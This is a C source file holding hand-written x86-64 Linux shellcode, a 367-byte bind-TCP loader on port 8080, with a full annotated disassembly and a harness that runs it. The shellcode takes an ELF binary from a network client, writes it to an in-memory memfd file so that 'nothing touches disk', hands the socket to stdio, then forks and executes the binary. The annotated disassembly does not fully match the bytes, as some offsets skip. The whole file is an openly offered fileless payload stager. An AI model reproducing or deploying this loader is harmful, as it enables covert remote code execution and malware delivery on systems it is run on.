#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

/*

bind tcp elf loader -- 367 Bytes (w/ error checking) -- 11AUG2021 -- icon

Reads in up to 0x1fffff bytes from an opened port, creates a virtual file
with memcreate_fd syscall, and then forks and execve's the created file.
Nothing touches disk.

All FDs of the execve'd process are dup2 to the client connection

remove the jump_exit section if you need a little more space

see the sender.py file for a simple poc on use

only works if the created memfd is 9 or lower, due to construction of the
binary name

check each syscall; jmp to r14 if syscall returned -1 (most do on failure)
0:  48 85 c0                test   rax,rax
3:  79 03                   jns    0x8
5:  41 ff e6                jmp    r14
"\x48\x85\xc0\x79\x03\x41\xFF\xE6"

--------------------------------------------------------------------
Exit stub; jumps here on failure
0:  eb 4c                   jmp    0x4e
2:  8d 35 ff ff ff ff       lea    esi,[rip+0xffffffffffffffff]        // 0x7
8:  41 80 c6 07             add    r14b,0x7
c:  eb 0a                   jmp    0x18
e:  48 31 c0                xor    rax,rax
11: 48 89 c7                mov    rdi,rax
14: b0 3c                   mov    al,0x3c
16: 0f 05                   syscall

mmap a section of memory of size 0x1fffffff
18: 48 31 c0                xor    rax,rax
1b: 50                      push   rax
1c: 50                      push   rax
1d: 5f                      pop    rdi
1e: 5e                      pop    rsi
1f: be ff ff ff 01          mov    esi,0x1ffffff
24: 6a 07                   push   0x7
26: 5a                      pop    rdx
27: 6a 22                   push   0x22
29: 41 5a                   pop    r10
2b: 4d 31 c0                xor    r8,r8
2e: 4d 31 c9                xor    r9,r9
31: b0 09                   mov    al,0x9
33: 0f 05                   syscall
35: 49 89 c7                mov    r15,rax
38: 48 85 c0                test   rax,rax
3b: 79 03                   jns    0x40
3d: 41 ff e6                jmp    r14

create a virtual file, save fd in r10
40: 48 31 c0                xor    rax,rax
43: 50                      push   rax
44: 48 89 e7                mov    rdi,rsp
47: 48 31 f6                xor    rsi,rsi
4a: 66 b8 3f 01             mov    ax,0x13f
4e: 0f 05                   syscall
50: 49 89 c2                mov    r10,rax
53: 48 85 c0                test   rax,rax
56: 79 03                   jns    0x5b
58: 41 ff e6                jmp    r14

create a server socket, save fd in r13
5b: 48 31 c0                xor    rax,rax
5e: 50                      push   rax
5f: 50                      push   rax
60: b0 02                   mov    al,0x2
62: 50                      push   rax
63: 5f                      pop    rdi
64: 5e                      pop    rsi
65: ff c6                   inc    esi
67: 5a                      pop    rdx
68: b2 06                   mov    dl,0x6
6a: b0 29                   mov    al,0x29
6c: 0f 05                   syscall
6e: 49 89 c5                mov    r13,rax
71: 48 85 c0                test   rax,rax
74: 79 03                   jns    0x79
76: 41 ff e6                jmp    r14

create s sockaddr struct and bind
79: 48 31 d2                xor    rdx,rdx
7c: 52                      push   rdx
7d: 52                      push   rdx
7e: 80 c2 02                add    dl,0x2
81: 66 89 14 24             mov    WORD PTR [rsp],dx
85: 66 c7 44 24 02 1f 90    mov    WORD PTR [rsp+0x2],0x901f
8c: 48 89 c7                mov    rdi,rax
8f: 48 89 e6                mov    rsi,rsp
92: b2 10                   mov    dl,0x10
94: 48 31 c0                xor    rax,rax
97: b0 31                   mov    al,0x31
99: 0f 05                   syscall
9b: 48 85 c0                test   rax,rax
9e: 79 03                   jns    0xa3
a0: 41 ff e6                jmp    r14

listen on the server socket
a3: 48 31 c0                xor    rax,rax
a6: b0 32                   mov    al,0x32
a8: 4c 89 ef                mov    rdi,r13
ab: 48 31 f6                xor    rsi,rsi
ae: 40 b6 0f                mov    sil,0xf
b1: 0f 05                   syscall
b3: 48 85 c0                test   rax,rax
b6: 79 03                   jns    0xbb
b8: 41 ff e6                jmp    r14

accept a connection on the server socket, store fd in r12
bb: b0 2b                   mov    al,0x2b
bd: 4c 89 ef                mov    rdi,r13
c0: 48 31 f6                xor    rsi,rsi
c3: 48 31 d2                xor    rdx,rdx
c6: 0f 05                   syscall
c8: 49 89 c4                mov    r12,rax
cb: 48 85 c0                test   rax,rax
ce: 79 03                   jns    0xd3
d0: 41 ff e6                jmp    r14

read data from the connected socket in a loop, offsetting into the buffer
if only one byte is read, continue on (handles partial reads)
increment r8 to hold total data read
d3: 4d 31 c0                xor    r8,r8
d6: 48 31 c0                xor    rax,rax
d9: 4c 89 e7                mov    rdi,r12
dc: 4c 89 fe                mov    rsi,r15
df: 4c 01 c6                add    rsi,r8
e2: 48 89 c2                mov    rdx,rax
e5: 81 c2 ff ff ff 01       add    edx,0x1ffffff
eb: 0f 05                   syscall
ed: 49 01 c0                add    r8,rax
f0: 83 f8 01                cmp    eax,0x1
f3: 75 e1                   jne    0xd6
f5: 41 50                   push   r8
f7: 48 85 c0                test   rax,rax
fa: 79 03                   jns    0xff
fc: 41 ff e6                jmp    r14

write r8 bytes from the buffer into the vfile
ff:     48 31 c0                xor    rax,rax
102:    48 ff c0                inc    rax
105:    4c 89 d7                mov    rdi,r10
108:    4c 89 fe                mov    rsi,r15
10b:    5a                      pop    rdx
10c:    0f 05                   syscall
10e:    48 85 c0                test   rax,rax
111:    79 03                   jns    0x116
113:    41 ff e6                jmp    r14

loop over fd 3-0 and dup2 them to the client socket
116:    48 31 c0                xor    rax,rax
119:    41 54                   push   r12
11b:    5f                      pop    rdi
11c:    48 31 f6                xor    rsi,rsi
11f:    40 b6 03                mov    sil,0x3
122:    ff ce                   dec    esi
124:    b0 21                   mov    al,0x21
126:    0f 05                   syscall
128:    75 f8                   jne    0x122
12a:    48 31 c0                xor    rax,rax
12d:    b0 39                   mov    al,0x39
12f:    0f 05                   syscall
131:    48 85 c0                test   rax,rax
134:    74 03                   je     0x139
136:    41 ff e6                jmp    r14

setup the arguments and execve
139:    48 89 d3                mov    rbx,rdx
13c:    48 31 c0                xor    rax,rax

get ASCII value of FD by adding 0x30 (0x01 + 0x30 = 0x31 ('1'))
13f:    49 83 c2 30             add    r10,0x30
143:    48 31 d2                xor    rdx,rdx
146:    52                      push   rdx
147:    48 89 e2                mov    rdx,rsp
14a:    48 b9 ef be ad de de    movabs rcx,0xbadc0dedeadbeef
151:    c0 ad 0b
154:    51                      push   rcx
155:    49 89 e0                mov    r8,rsp
16a:    50                      push   rax

setup the filename of /proc/self/fd//X
16b:    48 b9 6c 66 2f 2f 66    movabs rcx,0x412f64662f2f666c
172:    64 2f 41
175:    51                      push   rcx
176:    48 b9 2f 70 72 6f 63    movabs rcx,0x65732f636f72702f
17d:    2f 73 65
180:    51                      push   rcx

swap the X with the ASCII value of the fd (1-9 supported)
181:    44 88 54 24 0f          mov    BYTE PTR [rsp+0xf],r10b
186:    48 89 e7                mov    rdi,rsp

setup the **argv on the stack, and execve
189:    50                      push   rax
18a:    41 50                   push   r8
18c:    41 51                   push   r9
18e:    57                      push   rdi
18f:    48 89 e6                mov    rsi,rsp
192:    b0 3b                   mov    al,0x3b
194:    0f 05                   syscall
196:    48 85 c0                test   rax,rax
199:    79 03                   jns    0x19e
19b:    41 ff e6                jmp    r14

*/

#define port "\x1f\x90" // 8080
#define jump_exit "\x48\x85\xc0\x79\x03\x41\xFF\xE6"
#define read_section                                                           \
  "\x4D\x31\xC0\x48\x31\xC0\x4C\x89\xE7\x4C\x89\xFE\x4C\x01\xC6\x48\x89\xC2"   \
  "\x81\xC2\xFF\xFF\xFF\x01\x0F\x05\x49\x01\xC0\x83\xf8\x01\x75\xe1\x41\x50"

unsigned char loader[] =
    "\x4C\x8D\x35\xff\xff\xff\xff\x41\x80\xc6\x07\xeb\x0a\x48\x31\xC0"
    "\x48\x89\xC7\xB0\x3C\x0F\x05"
    // mmap
    "\x48\x31\xC0\x50\x50\x5F\x5E\xBE\xFF\xFF\xFF\x01\x6A\x07\x5A\x6A\x22"
    "\x41"
    "\x5A\x4D\x31\xC0\x4D\x31\xC9\xB0\x09\x0F\x05\x49\x89\xC7" jump_exit
    // virtual file create
    "\x48\x31\xC0\x50\x48\x89\xE7\x48\x31\xF6\x66\xB8\x3F\x01\x0F\x05\x49"
    "\x89"
    "\xC2" jump_exit
    // socket
    "\x48\x31\xC0\x50\x50\xB0\x02\x50\x5F\x5E\xFF\xC6\x5A\xB2\x06\xB0\x29"
    "\x0F"
    "\x05\x49\x89\xC5" jump_exit
    // sockaddr and bind
    "\x48\x31\xD2\x52\x52\x80\xC2\x02\x66\x89\x14\x24\x66\xC7\x44\x24\x02" port
    "\x48\x89\xC7\x48\x89\xE6\xB2\x10\x48\x31\xC0\xB0\x31\x0F\x05\x48"
    "\x85\xc0\x79\x03\x41\xFF\xE6"
    // listen
    "\x48\x31\xC0\xB0\x32\x4C\x89\xEF\x48\x31\xF6\x40\xB6\x0F\x0f"
    "\x05" jump_exit
    // accept
    "\xB0\x2B\x4C\x89\xEF\x48\x31\xF6\x48\x31\xD2\x0F\x05\x49\x89"
    "\xC4" jump_exit read_section
    // write virtual file
    "\x48\x31\xC0\x48\xFF\xC0\x4C\x89\xD7\x4C\x89\xFE\x5a\x0F\x05" jump_exit
    // dup fd 0-3 to socket fd
    "\x48\x31\xC0\x41\x54\x5F\x48\x31\xF6\x40\xB6\x03\xFF\xCE\xB0\x21\x0F"
    "\x05"
    "\x75\xf8"
    // fork and proc check
    "\x48\x31\xC0\xB0\x39\x0F\x05"
    "\x48\x85\xc0\x74\x03\x41\xFF\xE6"
    // execve and args
    "\x48\x89\xD3\x48\x31\xC0\x49\x83\xC2\x30\x48\x31\xF6\x48\x31\xD2\x50\x48"
    "\xB9\x6C\x66\x2F\x2F\x66\x64\x2F\x41\x51\x48\xB9\x2F\x70\x72\x6F\x63\x2F"
    "\x73\x65\x51\x44\x88\x54\x24\x0F\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x89"
    "\xE2\xB0\x3B\x0F\x05"
    // jmp exit
    "\x41\xFF\xE6";

int main(int argc, char **argv) {

  printf("Len: %d\n", sizeof(loader));

  mprotect((void *)((intptr_t)loader & ~0xFFF), 8192, PROT_READ | PROT_EXEC);

  int (*test)() = (int (*)())loader;
  test();
}
